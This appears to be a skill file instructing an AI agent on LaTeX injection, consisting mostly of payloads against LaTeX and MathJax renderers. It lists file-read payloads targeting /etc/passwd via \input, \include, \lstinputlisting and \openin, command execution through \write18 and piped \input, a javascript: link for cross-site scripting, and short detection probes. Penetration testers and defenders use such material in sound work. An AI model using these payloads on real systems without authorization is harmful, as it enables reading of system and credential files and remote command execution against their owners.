---
name: latex-injection
description: >-
  LaTeX injection. Use when user input is rendered by a LaTeX or MathJax processor.
---

# LaTeX Injection


When applications compile user-provided LaTeX (thesis generators, PDF report builders, math rendering):

### File Read

```latex
\input{/etc/passwd}
\include{/etc/passwd}

% With line numbers:
\lstinputlisting{/etc/passwd}

% Via verbatim:
\newread\file
\openin\file=/etc/passwd
\read\file to\line
\text{\line}
\closein\file
```

### Command Execution (requires --shell-escape or equivalent)

```latex
% write18 is the classic RCE primitive:
\immediate\write18{id > /tmp/output.txt}
\input{/tmp/output.txt}

% Pipe variant:
\immediate\write18{cat /etc/passwd | base64 > /tmp/b64.txt}

% Input with pipe (some engines):
\input{|id}
```

### Cross-Site Scripting (MathJax/client-side LaTeX)

```latex
% If LaTeX is rendered client-side via MathJax or KaTeX:
% Some versions allow HTML injection through \href or \url:
\href{javascript:alert(1)}{click}
```

### Detection

```text
# Probe: Does the following render?
$\frac{1}{2}$           → basic math renders
\input{/etc/hostname}    → file inclusion attempt
\write18{id}             → command execution attempt
```

---
